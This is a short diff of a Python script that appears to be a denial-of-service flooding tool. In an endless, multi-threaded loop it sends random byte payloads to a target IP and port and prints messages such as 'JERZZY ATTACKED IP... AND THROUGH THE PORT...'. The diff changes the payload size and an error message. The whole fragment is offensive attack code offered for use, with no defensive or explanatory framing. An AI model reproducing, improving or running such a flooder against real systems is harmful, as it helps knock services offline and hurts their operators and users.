@@ -40,7 +40,7 @@ def run():
 			print("[!] ERROR SERVER TIME OUT")
 
 def run2():
-	data = random._urandom(65)
+	data = random._urandom(18)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -52,7 +52,7 @@ def run2():
 			print(i +" JERZZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
 		except:
 			s.close()
-			print("[*] ERROR SERVER TIME OUT")
+			print("[-] ATTACK")
             
 for y in range(threads):
 	if choice == 'y':
